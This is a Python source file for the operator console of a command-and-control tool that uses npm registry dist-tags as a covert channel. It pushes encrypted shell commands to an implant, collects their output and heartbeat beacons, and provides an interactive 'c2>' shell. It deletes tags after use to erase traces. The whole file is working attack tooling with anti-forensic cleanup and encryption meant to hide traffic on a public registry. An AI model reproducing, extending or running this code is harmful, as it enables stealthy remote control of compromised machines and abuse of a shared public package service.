"""Operator side: push commands, read results, inspect beacons."""

from __future__ import annotations

import sys
import time

import requests

from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA
from . import (encode_payload, group_chunks, group_chunks_with_id,
               decode_tag, registry_path)
from .crypto import derive_key, seal, open_sealed, compress, decompress
import npm_c2 as _nc


class RegistryError(RuntimeError):
    """The registry answered with an HTTP error the operator must see."""


class Operator:
    def __init__(self, package, token, passphrase=None):
        self.package = package
        self.url = _nc.API.format(registry_path(package))
        self.s = requests.Session()
        self.s.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
        })
        self.consumed: set[str] = set()
        # Tags this operator pushed, for the post-run wipe. None = unknown,
        # True = the registry accepted DELETE, False = it refuses (npm).
        self.pushed_tags: set[str] = set()
        self.can_delete = None
        self.verbose = False
        # Without a passphrase the channel stays plaintext (legacy behaviour
        # and the mock-registry tests). With one, every payload is sealed and
        # a tag read off the public registry reveals nothing.
        self.key = derive_key(passphrase) if passphrase else None

    def _aad(self):
        """Binds a ciphertext to this package, so it cannot be replayed
        into a different channel."""
        return self.package.encode()

    # ------------------------------------------------------------ commands
    def push_task(self, command, quiet=False):
        ok = True
        data = compress(command.encode())
        if self.key:
            # Seal the whole payload first, then chunk it: chunking a sealed
            # blob is the only ordering that survives reassembly.
            data = seal(self.key, data, self._aad())
        for tag in encode_payload(data, CMD_PREFIX):
            try:
                r = self.s.put(f"{self.url}/{tag}", json=TAG_VALUE, timeout=20)
            except requests.RequestException as e:
                print(f"[-] {tag}: {e}", file=sys.stderr)
                return False
            if r.status_code >= 300:
                body = r.text[:120]
                print(f"[-] {tag}: HTTP {r.status_code} {body}", file=sys.stderr)
                ok = False
                break
            self.pushed_tags.add(tag)
            if not quiet:
                print(f"[+] {tag}")
        return ok

    def run_command(self, command, timeout=120.0, interval=3.0, quiet=False):
        """Queue one command, wait for its output, then wipe the tags.

        The wipe happens only after the output has been read: deleting first
        would race the operator against its own reply.
        """
        baseline = set(self._fetch())
        self.pushed_tags = set()
        if not self.push_task(command, quiet=quiet):
            return None
        if not quiet:
            print(f"[*] waiting up to {timeout}s for output")
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(interval)
            tags = self._fetch()
            new = {t: v for t, v in tags.items() if t not in baseline}
            for gid, buf, complete in group_chunks_with_id(new, RES_PREFIX):
                if not complete:
                    continue
                self.consumed.update(
                    t for t in new if t.startswith(RES_PREFIX))
                # Everything this command produced, plus the command itself.
                group = [t for t in new if t.startswith(RES_PREFIX)
                         and (decode_tag(t) or {}).get("gid") == gid]
                output = self._open(buf)
                self._wipe(list(self.pushed_tags) + group)
                return output
        return None

    # ------------------------------------------------------------- cleanup
    def _wipe(self, tags):
        """Delete tags after use, and stop trying if the registry refuses.

        npm rejects DELETE for a granular token that bypasses 2FA ("may not
        perform this action"), so the first refusal disables further attempts
        instead of burning a failed request per command.
        """
        if not tags or self.can_delete is False:
            return 0
        removed = 0
        for tag in tags:
            ok = self._delete(tag)
            if ok:
                removed += 1
            elif self.can_delete is False:
                break
        return removed

    def _delete(self, tag):
        try:
            r = self.s.delete(f"{self.url}/{tag}", timeout=15)
        except requests.RequestException:
            return False
        if r.status_code in (200, 201, 204, 404):
            self.can_delete = True
            return True
        if r.status_code in (401, 403):
            self.can_delete = False
            if self.verbose:
                print(f"[!] {tag}: registry refuses DELETE "
                      f"({r.status_code}), auto-clean disabled",
                      file=sys.stderr)
            return False
        return False

    def clean(self, all_tags=False):
        """Delete channel tags. Returns (removed, still_present)."""
        names = list(self._fetch())
        if not all_tags:
            names = [t for t in names if t != "latest"]
        removed = self._wipe(names)
        left = [t for t in names if t != "latest"]
        return removed, (0 if self.can_delete is False else len(left))

    def _open(self, buf):
        """Decrypt a reassembled payload when the channel is encrypted."""
        if not self.key:
            return decompress(buf).decode("utf-8", errors="replace")
        try:
            plain = open_sealed(self.key, buf, self._aad())
        except Exception:
            # Wrong passphrase or a tag written before encryption was enabled.
            return "<undecryptable: wrong passphrase or plaintext tag>"
        return decompress(plain).decode("utf-8", errors="replace")

    # ------------------------------------------------------------- results
    def poll_results(self, unread_only=False):
        tags = self._fetch()
        found = 0
        for buf, complete in group_chunks(tags, RES_PREFIX):
            if not complete:
                print("[!] incomplete result group, waiting for the next poll")
                continue
            found += 1
            print(f"[res] {self._open(buf)}")
            print("---")
        if not found:
            print("[i] no results")

    def watch(self, interval=5.0):
        seen: set[str] = set()
        print(f"[*] watching (every {interval}s)")
        try:
            while True:
                tags = self._fetch()
                fresh = [t for t in tags if t not in seen]
                seen.update(fresh)
                for buf, complete in group_chunks(fresh, RES_PREFIX):
                    if not complete:
                        continue
                    print(f"[{time.strftime('%H:%M:%S')}] {self._open(buf)}")
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] stopped")

    def interact(self, interval=5.0, timeout=120.0):
        """A thin console: type a command, get its output, repeat."""
        print(f"[*] interactive channel on {self.package}")
        print("[*] commands: any shell line, or :help for meta-commands")
        try:
            while True:
                try:
                    line = input("c2> ")
                except EOFError:
                    print()
                    break
                if not line.strip():
                    continue
                if line.startswith(":"):
                    self._meta(line, timeout)
                    continue
                out = self.run_command(line, timeout=timeout,
                                       interval=interval, quiet=False)
                if out is None:
                    print("[!] no output before the timeout; check `stats`")
                else:
                    print(out)
        except KeyboardInterrupt:
            print("\n[*] detached (implant keeps polling)")

    def _meta(self, line, timeout):
        cmd, _, arg = line[1:].partition(" ")
        cmd = cmd.strip().lower()
        if cmd in ("q", "quit", "exit"):
            raise KeyboardInterrupt
        if cmd == "help":
            print("  :stats          tag counts")
            print("  :beacons        heartbeat tags")
            print("  :poll           print all results")
            print("  :wait <sec>     change the per-command timeout")
            print("  :interval <sec> change the poll interval")
            print("  :clean          remove c2 tags from the channel")
            print("  :quit")
            return
        if cmd == "stats":
            self.stats()
        elif cmd == "beacons":
            self.list_beacons()
        elif cmd == "poll":
            self.poll_results()
        elif cmd == "clean":
            self.clean_tags()
        else:
            print(f"[!] unknown meta-command :{cmd}")

    def list_beacons(self):
        names = [t for t in self._fetch() if t.startswith(HBT_PREFIX)]
        for n in sorted(names):
            print(f"[beacon] {n}")
        if not names:
            print("[i] no beacons")

    def stats(self):
        tags = self._fetch()
        cmds = [t for t in tags if t.startswith(CMD_PREFIX)]
        res = [t for t in tags if t.startswith(RES_PREFIX)]
        hbt = [t for t in tags if t.startswith(HBT_PREFIX)]
        print(f"pending: {len(cmds)}, results: {len(res)}, beacons: {len(hbt)}")
        for c in sorted(cmds)[:5]:
            print(f"  {c}")

    def clean_tags(self, all_tags=False):
        try:
            tags = self._fetch()
        except RegistryError as e:
            print(f"[-] {e}", file=sys.stderr)
            return
        targets = [n for n in tags
                   if (n != "latest" if all_tags
                       else n.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)))]
        removed = self._wipe(targets)
        left = max(0, len(targets) - removed)
        print(f"[+] removed {removed} tags" if removed
              else "[i] nothing to clean")
        if left and self.can_delete is False:
            print(f"[!] {left} tag(s) left: this token cannot delete "
                  "(npm refuses DELETE for bypass-2FA granular tokens)")

    # ---------------------------------------------------------------- http
    def _fetch(self) -> dict:
        try:
            r = self.s.get(self.url, timeout=20)
        except requests.RequestException as e:
            raise RegistryError(f"GET {self.url}: {e}") from e
        if r.status_code == 404:
            raise RegistryError(f"package {self.package!r} not found (404)")
        if r.status_code in (401, 403):
            raise RegistryError(f"token rejected ({r.status_code})")
        if r.status_code >= 300:
            raise RegistryError(f"GET {self.url}: HTTP {r.status_code}")
        try:
            data = r.json()
        except ValueError as e:
            raise RegistryError(f"registry returned non-JSON: {e}") from e
        if not isinstance(data, dict):
            raise RegistryError("registry returned no dist-tags object")
        return data
